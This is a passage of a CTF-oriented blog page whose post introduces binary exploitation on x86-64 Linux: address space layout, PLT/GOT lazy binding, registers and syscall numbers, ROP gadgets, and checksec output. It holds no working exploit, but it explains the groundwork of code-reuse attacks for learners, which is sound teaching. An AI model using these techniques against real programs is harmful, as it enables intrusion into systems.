    volantis.requestAnimationFrame(loop)
  }
  volantis.scroll.handleScrollEvents()
  volantis.scroll.ele = null;
  // 触发页面滚动至目标元素位置
  volantis.scroll.to = (ele, option = {}) => {
    if (!ele) return;
    volantis.scroll.ele = ele;
    // 默认配置
    opt = {
      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
      behavior: "smooth"
    }
    // 定义配置
    if ("top" in option) {
      opt.top = option.top
    }
    if ("behavior" in option) {
      opt.behavior = option.behavior
    }
    if ("addTop" in option) {
      opt.top += option.addTop
    }
    if (!("observerDic" in option)) {
      option.observerDic = 100
    }
    // 滚动
    window.scrollTo(opt);
    // 监视器
    // 监视并矫正元素滚动到指定位置
    // 用于处理 lazyload 引起的 cls 导致的定位失败问题
    // option.observer = false
    if (option.observer) {
      setTimeout(() => {
        if (volantis.scroll.ele != ele) {
          return
        }
        volantis.scroll.unengine.push(() => {
          let me = ele.getBoundingClientRect().top
          if (!(me >= -option.observerDic && me <= option.observerDic)) {
            volantis.scroll.to(ele, option)
          }
          volantis.scroll.unengine.remove("unengineObserver")
        }, "unengineObserver")
      }, 1000)
    }
  }
  /********************** Content Visibility ********************************/
  // 见 source/css/first.styl 如果遇到任何问题 删除 .post-story 即可
  // 一个元素被声明 content-visibility 属性后 如果元素不在 viewport 中 浏览器不会计算其后代元素样式和属性 从而节省 Style & Layout 耗时
  // content-visibility 的副作用: 锚点失效 等等(实验初期 暂不明确), 使用此方法清除样式
  volantis.cleanContentVisibility = () => {
    if (document.querySelector(".post-story")) {
      console.log("cleanContentVisibility");
      document.querySelectorAll(".post-story").forEach(e => {
        e.classList.remove("post-story")
      })
    }
  }
  /******************************************************************************/
  /******************************************************************************/
  /******************************************************************************/
  //图像加载出错时的处理
  function errorImgAvatar(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg";
    img.onerror = null;
  }
  function errorImgCover(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg";
    img.onerror = null;
  }
  /******************************************************************************/
</script>

<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  pdata.commentConfig={};
  volantis.GLOBAL_CONFIG ={
    root: '/en/',
    debug: "env",
    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
    lastupdate: new Date(1771999068541),
    cdn: {
      izitoast_css: 'https://unpkg.com/izitoast@1.4.0/dist/css/iziToast.min.css',
      izitoast_js: 'https://unpkg.com/izitoast@1.4.0/dist/js/iziToast.min.js',
      fancybox_css: 'https://unpkg.com/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css',
      fancybox_js: 'https://unpkg.com/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js'
    },
    sidebar: {
      for_page: ["blogger","category","tagcloud","donate"],
      for_post: ["toc"],
      webinfo: {
        lastupd: {
          enable: true,
          friendlyShow: true
        },
        runtime: {
          data: "2020/01/01",
          unit: "天"
        }
      }
    },
    plugins: {
      message: {"enable":true,"icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"知识共享许可协议","message":"请遵守 CC BY-NC-SA 4.0 协议。","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
      
      
    },
    search: {
      

      
        dataPath: (("/en/" || "/").endsWith("/") ? "/en/" || "/" : "/en//" || "/") + "content.json",
      

      
    },
    languages: {
      
        search: {
          hits_empty: "We didn't find any results for the search: ${query}.",
          hits_stats: "${hits} results found in ${time} ms",
        }
      
    }
  }
</script>
  <!-- import head_end begin -->
  <!-- import head_end end -->
  <!-- Custom Files headEnd begin-->
  
  <!-- Custom Files headEnd end-->
</head>
  <body itemscope itemtype="https://schema.org.cn/WebPage">
    
    <header itemscope itemtype="https://schema.org.cn/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone'>
        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self" title="comment"></a></li>
        
          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self" title="toc"></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/en/'>
          
            <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/Logo-NavBar@3x.png'/>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/" title="Blog"
                  
                  
                  
                    active-action="action-en"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>Blog
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/categories/" title="Categories"
                  
                  
                  
                    active-action="action-encategories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>Categories
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/tags/" title="Tags"
                  
                  
                  
                    active-action="action-entags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>Tags
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/archives/" title="Archievs"
                  
                  
                  
                    active-action="action-enarchives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>Archievs
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/friends/" title="Friends"
                  
                  
                  
                    active-action="action-enfriends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>Friends
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/about/" title="About"
                  
                  
                  
                    active-action="action-enabout"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>About
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box header toggle-mode-btn">
                  <i class='fa-solid fa-moon fa-fw'></i>Dark
                </a>
              <li>
            
          
          
				</ul>
			</div>
      
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fa-solid fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>
      

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" title="search"></a></li>
				
				<li>
          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" title="menu"></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/" title="Blog"
                  
                  
                  
                    active-action="action-en"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>Blog
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/categories/" title="Categories"
                  
                  
                  
                    active-action="action-encategories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>Categories
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/tags/" title="Tags"
                  
                  
                  
                    active-action="action-entags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>Tags
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/archives/" title="Archievs"
                  
                  
                  
                    active-action="action-enarchives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>Archievs
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/friends/" title="Friends"
                  
                  
                  
                    active-action="action-enfriends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>Friends
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/about/" title="About"
                  
                  
                  
                    active-action="action-enabout"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>About
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box header toggle-mode-btn">
                  <i class='fa-solid fa-moon fa-fw'></i>Dark
                </a>
              <li>
            
          
            
          </ul>
        </li>
			</ul>

      <!-- Custom Files header begin -->
      
      <!-- Custom Files header end -->
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
      <div class="cover-wrapper post dock" id='half'>
        
  <div id="parallax-window"></div>

<div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">Archer's blog</p>
    
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/en/"
              
              
              active-action="action-en">
              <i class='fa-solid fa-rss fa-fw'></i><p>Blog</p>
            </a>
          
            <a href="/en/categories/"
              
              
              active-action="action-encategories">
              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f5c3.svg'><p>Categories</p>
            </a>
          
            <a href="/en/tags/"
              
              
              active-action="action-entags">
              <i class='fa-solid fa-tags fa-fw'></i><p>Tags</p>
            </a>
          
            <a href="/en/archives/"
              
              
              active-action="action-enarchives">
              <i class='fa-solid fa-archive fa-fw'></i><p>Archievs</p>
            </a>
          
            <a href="/en/friends/"
              
              
              active-action="action-enfriends">
              <i class='fa-solid fa-link fa-fw'></i><p>Friends</p>
            </a>
          
            <a href="/en/about/"
              
              
              active-action="action-enabout">
              <i class='fa-solid fa-info-circle fa-fw'></i><p>About</p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

      </div>
    
  
</div>

      <div id="safearea">
        <div class="body-wrapper">
          
<div id="l_main" class=''>
  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
  <link itemprop="mainEntityOfPage" href="https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn入门/">
  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
    <meta itemprop="name" content="Hexo">
  </span>
  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
    <meta itemprop="name" content="Hexo">
    <meta itemprop="description" content="hi">
  </span>
  


  
    <span hidden>
      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
    </span>
  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title" itemprop="name headline">
        Intro to Pwn (Binary Exploitation)
      </h1>
      <div class='new-meta-box'>
        
          
            
  
  
  
  <div class='new-meta-item category'>
    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
    <a class="category-link" href="/en/categories/CTF/">CTF</a><span class="sep"></span><a class="category-link" href="/en/categories/CTF/Pwn/">Pwn</a>
    
      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
        <a href="/en/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
      </span>
    
      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
        <a href="/en/categories/CTF/Pwn/" itemprop="url"><span itemprop="name">Pwn</span></a>
      </span>
    
  </div>
  



          
        
          
            
  
  
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/en/tags/Pwn/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwn</p></a></div>
  <span hidden itemprop="keywords">Pwn</span>
  


          
        
          
            <div class="new-meta-item date" itemprop="dateModified" datetime="2026-02-25T06:57:18+01:00">
  <a class='notlink'>
    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
    <p>Last UpdatedFeb 25, 2026</p>
  </a>
</div>

          
        
          
            


<div class="new-meta-item browse">
  <a class='notlink'>
    <p>
      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
      
      <span id="busuanzi_page_pv">
        <i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i>
      </span>
        
      <span>次浏览</span>
    </p>
  </a>
</div>


          
        
        <!-- Custom Files topMeta begin-->
        
        <!-- Custom Files topMeta end-->
      </div>
    
  </div>


  <div id="layoutHelper-page-plugins"></div>
  <div id="post-body" itemprop="articleBody">
    <p><strong>This article mainly introduces common pwn vulnerabilities and exploitation approaches for 64-bit programs on the x86-64 architecture.</strong></p>
<p>(Many parts about background knowledge, security checks, and tool introductions may be completely confusing at first. That’s totally fine—just know these things exist, and come back when you need a specific concept/command later.)</p>
<h2 id="Background-Knowledge"><a href="#Background-Knowledge" class="headerlink" title="Background Knowledge"></a><strong>Background Knowledge</strong></h2><h3 id="Address-Space-Prozess-Adressraum"><a href="#Address-Space-Prozess-Adressraum" class="headerlink" title="Address Space (Prozess Adressraum)"></a><strong>Address Space (Prozess Adressraum)</strong></h3><p>An <strong>address space</strong> can be viewed as a huge <strong>one-dimensional byte array</strong>. While a program is running, only a small portion of it (compared to its potential size) actually contains data. Because the address space is very sparse, the OS divides it into equally sized <strong>pages</strong>, and only the pages that are <strong>mapped</strong> by the OS can be accessed.</p>
<p>When a program is loaded from disk, it is placed into the lower address range (the corresponding pages are provided automatically by the OS or the program loader).</p>
<p>Executable machine code is stored in the <strong>text segment (Text Segment)</strong>. Statically initialized variables and string constants are stored in the <strong>data segment (Data Segment)</strong>. Static variables that are not initialized at program start go into the <strong>BSS segment</strong>, and are filled with zero bytes by the OS.</p>
<p>Dynamic libraries needed by the program also consist of these segments, and are loaded by the program loader into higher memory addresses. Since these libraries typically request memory through the <strong>mmap system call</strong>, they are often referred to as belonging to the <strong>MMap segment</strong>.</p>
<p>During program initialization, two additional regions are reserved:</p>
<ul>
<li><strong>Stack</strong>: for automatically managed variables.</li>
<li><strong>Heap</strong>: for dynamically allocated variables.</li>
</ul>
<p>Each function call expands the stack by creating a <strong>stack frame</strong>. A stack frame stores the current function’s local variables and some management data, such as the <strong>return address</strong>. The return address records where the current function was called from. As call depth increases, the stack grows from high addresses down to low addresses.</p>
<p>When you need data to remain valid after a function returns, you must allocate it on the <strong>heap</strong> (because stack variables are automatically freed when the function returns). In this situation, the program uses the <strong>allocator provided by libc</strong>, typically via <strong>malloc</strong>, to request memory. If possible, the allocator returns a pointer into the pre-reserved heap region. If the heap space is insufficient, the allocator requests a new mapped region via <strong>mmap</strong> and returns a pointer into that region.</p>
<p><img src="/images/image-20250818000141067.png" class="lazyload" data-srcset="/images/image-20250818000141067.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250818000141067"></p>
<p><br></p>
<p>Besides the allocator, the C standard library (<strong>libc</strong>) also provides many commonly used functions to simplify interaction with the operating system.</p>
<p>Code (the text segment) is fixed, but the address of dynamic libraries (such as libc) can change each run due to ASLR, or may not even be known at compile time. So how does the program find the real address of <code>printf</code> or <code>system</code>?</p>
<p>That’s where PLT and GOT come in:</p>
<ul>
<li><strong>PLT (Procedure Linkage Table)</strong>:<ul>
<li>Stored in the <strong>.plt</strong> section (similar to the text segment: <strong>read-only, executable</strong> code).</li>
<li>Jumps via the GOT (by using the GOT entry address for the function).</li>
</ul>
</li>
<li><strong>GOT (Global Offset Table)</strong>:<ul>
<li>Stored in the <strong>.got.plt</strong> section (part of the data segment: <strong>readable, writable</strong> data).</li>
<li>Initially points back into the PLT; after resolution it points to libc.</li>
</ul>
</li>
</ul>
<p>For startup performance, Linux typically does not resolve all function addresses immediately. Instead, it resolves them only when they are first used. This is called <strong>lazy binding</strong>.</p>
<p>Lazy binding can be described in two stages:</p>
<p><strong>Stage 1: First call (symbol resolution phase)</strong></p>
<p>When the program calls a shared-library function (e.g., <code>printf</code>) for the first time, the address is not resolved yet, so execution proceeds like this:</p>
<ol>
<li><strong>Call PLT stub</strong>: Code in the program’s <code>.text</code> executes <code>call printf@plt</code>, transferring control to the corresponding <code>printf</code> stub in <code>.plt</code>.</li>
<li><strong>Indirect jump</strong>: The PLT stub executes <code>jmp *printf@GOT</code>, an indirect jump whose target is read from the corresponding entry in <code>.got.plt</code>.</li>
<li><strong>Fallthrough inside the PLT</strong>: Initially, the <code>.got.plt</code> entry does not contain the real function address. Instead, it contains the address of the <strong>next instruction inside the PLT stub</strong> (right after the <code>jmp</code>). Therefore control does not jump out yet; it continues executing the rest of the PLT stub.</li>
<li><strong>Prepare relocation parameters</strong>: The PLT stub pushes the relocation index for this symbol onto the stack, then jumps to the common PLT entry (PLT[0]).</li>
<li><strong>Invoke the dynamic linker</strong>: PLT[0] pushes the <code>link_map</code> structure pointer and calls the dynamic linker resolver (typically <code>_dl_runtime_resolve</code>).</li>
<li><strong>Resolve &amp; patch</strong>: <code>_dl_runtime_resolve</code> looks up <code>printf</code> in the exported symbol tables of loaded libraries, finds its actual virtual address (e.g., <code>0x7ffff7a0d123</code>), then:<ul>
<li><strong>Calls the function</strong>, and</li>
<li><strong>Updates the GOT entry</strong> by writing the real address into <code>.got.plt</code>, replacing the original “fallthrough” address.</li>
</ul>
</li>
</ol>
<p><strong>Stage 2: Subsequent calls (direct execution phase)</strong></p>
<p>When the program later executes <code>call printf@plt</code> again, the corresponding GOT entry has already been patched, so it becomes much simpler:</p>
<ol>
<li><strong>Call PLT stub</strong>: <code>call printf@plt</code> jumps into <code>.plt</code>.</li>
<li><strong>Direct redirection</strong>: The PLT stub executes <code>jmp *printf@GOT</code>, but now the <code>.got.plt</code> entry already contains the real address (e.g., <code>0x7ffff7a0d123</code>).</li>
<li><strong>Control transfer</strong>: The CPU jumps straight into <code>printf</code> inside libc, without invoking the dynamic linker again.</li>
</ol>
<p><br></p>
<p><strong>A more detailed address space layout illustration:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">High Address (usually around 0x7fffffffffff)</span><br><span class="line">            |</span><br><span class="line">+---------------------------+</span><br><span class="line">|    Kernel Space           | (Kernel space - not directly accessible in user mode)</span><br><span class="line">+---------------------------+</span><br><span class="line">|    Command Line Args      | (argv pointers)</span><br><span class="line">|    Environment Vars       | (envp pointers)</span><br><span class="line">+---------------------------+ &lt;--- [Stack Base]</span><br><span class="line">|                           |</span><br><span class="line">|          Stack            | (Stack)</span><br><span class="line">|       (Grows Down)        | Local vars, args, return addresses</span><br><span class="line">|            |              |</span><br><span class="line">|            v              |</span><br><span class="line">+---------------------------+ &lt;--- [RSP]</span><br><span class="line">|                           |</span><br><span class="line">|        (Random Gap)       | (Random offset for ASLR)</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|   Memory Mapping Segment  | &lt;--- [MMap Segment]</span><br><span class="line">|   (Shared Libraries)      | Shared libs (libc.so, ld-linux.so)</span><br><span class="line">|                           | </span><br><span class="line">|   +-------------------+   |</span><br><span class="line">|   |   libc.so .text   |   |</span><br><span class="line">|   | (real printf addr) |  |</span><br><span class="line">|   +-------------------+   |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       (Random Gap)        |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|            ^              |</span><br><span class="line">|            |              |</span><br><span class="line">|          Heap             | (Heap)</span><br><span class="line">|       (Grows Up)          | malloc/new allocations</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+ &lt;--- [Heap Base]</span><br><span class="line">|                           |</span><br><span class="line">|        .bss Segment       | (Uninitialized data)</span><br><span class="line">|  (Block Started by Symbol)| global_var defaults to 0</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       .data Segment       | (Initialized data)</span><br><span class="line">|                           | e.g., int flag = 1;</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|      .got.plt Section     | &lt;--- [GOT] (part of Data Segment)</span><br><span class="line">|   (Global Offset Table)   |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|        .plt Section       | &lt;--- [PLT] (part of Text Segment)</span><br><span class="line">|  (Procedure Linkage Table)|</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       .text Segment       | &lt;--- [Code segment]</span><br><span class="line">|      (Binary Code)        |</span><br><span class="line">|                           | main is here</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       Read-Only Data      | (.rodata) string literals like &quot;Hello World&quot;</span><br><span class="line">+---------------------------+</span><br><span class="line">            |</span><br><span class="line">            | (~0x00400000 if non-PIE; randomized if PIE)</span><br><span class="line">            |</span><br><span class="line">Low Address (0x000000000000)</span><br></pre></td></tr></table></figure>
<p>If ASLR is enabled (discussed below), then the Stack Base, MMap Base, and Heap Base are randomized each run.</p>
<p><br></p>
<p>During execution, if the program accesses an invalid address (an unmapped page), the OS sends a <strong>Segmentation Fault</strong> signal to the program. If the program does not handle it, it terminates.</p>
<hr>
<h3 id="x86-Assembly"><a href="#x86-Assembly" class="headerlink" title="x86 Assembly"></a><strong>x86 Assembly</strong></h3><p>Assembly is a large topic, so it’s not possible to cover everything here. You can find additional resources and learn along the way.</p>
<p>But you don’t need to fully master assembly before doing pwn. You can learn assembly while solving pwn challenges—having real examples often makes it easier and more efficient.</p>
<p><br></p>
<p>Here are a few important points:</p>
<p><strong>Linux x64 (System V AMD64 ABI) argument passing order:</strong></p>
<ol>
<li><strong><code>RDI</code></strong> (1st argument)</li>
<li><strong><code>RSI</code></strong> (2nd argument)</li>
<li><strong><code>RDX</code></strong> (3rd argument)</li>
<li><strong><code>RCX</code></strong> (4th argument)</li>
<li><strong><code>R8</code></strong> (5th argument)</li>
<li><strong><code>R9</code></strong> (6th argument)</li>
<li>Further arguments are passed on the stack</li>
</ol>
<p>Other commonly used registers:</p>
<ul>
<li><strong>RIP (Instruction Pointer)</strong><ul>
<li>Meaning: points to the address of the <strong>next</strong> instruction to execute.</li>
<li>Pwn relevance: when a function executes <code>ret</code>, the CPU pops an address into RIP.</li>
</ul>
</li>
<li><strong>RSP (Stack Pointer)</strong><ul>
<li>Meaning: always points to the top of the stack.</li>
<li>Pwn relevance: <code>push</code>/<code>pop</code> automatically change it.</li>
</ul>
</li>
<li><strong>RBP (Base Pointer)</strong><ul>
<li>Meaning: the base (bottom) of a stack frame.</li>
<li>Pwn relevance: used to locate locals; <code>leave; ret</code> can be used for stack pivoting.</li>
</ul>
</li>
<li><strong>RAX (Accumulator)</strong><ul>
<li>Normal usage: arithmetic results, function return values.</li>
<li>Pwn core usage (Syscall): for ret2syscall/SROP, <code>RAX</code> decides which syscall to invoke.<ul>
<li><code>RAX = 59</code> (<code>0x3b</code>) -&gt; <code>execve</code></li>
<li><code>RAX = 0</code> -&gt; <code>read</code></li>
<li><code>RAX = 1</code> -&gt; <code>write</code></li>
<li><code>RAX = 15</code> -&gt; <code>rt_sigreturn</code></li>
</ul>
</li>
</ul>
</li>
<li>Special segment register: <strong>FS</strong><ul>
<li>Pwn relevance: on 64-bit Linux, the stack canary value is stored at <code>fs:[0x28]</code>.</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a><strong>Gadget</strong></h3><p>A <strong>gadget</strong> is a short sequence of machine instructions extracted from existing executable memory regions (such as <code>.text</code> or shared libraries) for <strong>code-reuse attacks</strong>, and it <strong>ends with a control-flow transfer instruction</strong>.</p>
<p>The most common form is a <strong>ROP gadget</strong> (Return-Oriented Programming gadget), which ends strictly with <strong><code>ret</code></strong>.</p>
<p>A standard gadget consists of:</p>
<ol>
<li><strong>Operational instructions</strong>: perform actual computation/data movement/logic (e.g., <code>pop</code>, <code>mov</code>, <code>add</code>, <code>xor</code>).</li>
<li><strong>Terminator</strong>: returns control back to the attacker-controlled flow. In ROP, this is <code>ret</code>.</li>
</ol>
<p><strong>Execution primitive:</strong> gadgets are not called via <code>call</code> like normal functions. Instead, the attacker drives execution using the <strong>stack pointer (RSP/ESP)</strong> as a pseudo instruction pointer.</p>
<ul>
<li><strong>What <code>ret</code> really does</strong>: <code>pop rip</code>. It pops a value from the stack into RIP.</li>
<li>The attacker pre-arranges a sequence of addresses on the stack (a ROP chain).</li>
<li>Each gadget ends with <code>ret</code>, causing the CPU to fetch the <strong>next gadget address</strong> from the stack and jump to it.</li>
</ul>
<p>So in ROP, <code>RSP</code> effectively replaces the role of <code>RIP</code>, and stack data becomes an instruction stream.</p>
<p><br></p>
<p>Common gadgets:</p>
<ul>
<li><code>pop rdi ; ret</code>, <code>pop rsi ; ret</code>, <code>pop rdx ; ret</code>: set up function arguments</li>
<li><code>pop rbp</code>: pops 8 bytes into <code>rbp</code> and increments <code>rsp</code> by 8</li>
</ul>
<hr>
<h2 id="Security-Checks"><a href="#Security-Checks" class="headerlink" title="Security Checks"></a><strong>Security Checks</strong></h2><p>We can use <code>checksec</code> to check the security properties of a binary.</p>
<p>Install:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install checksec</span><br></pre></td></tr></table></figure>
<p>Examples:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./vuln</span><br><span class="line"></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./racecar</span><br><span class="line"></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec vuln</span><br><span class="line"></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
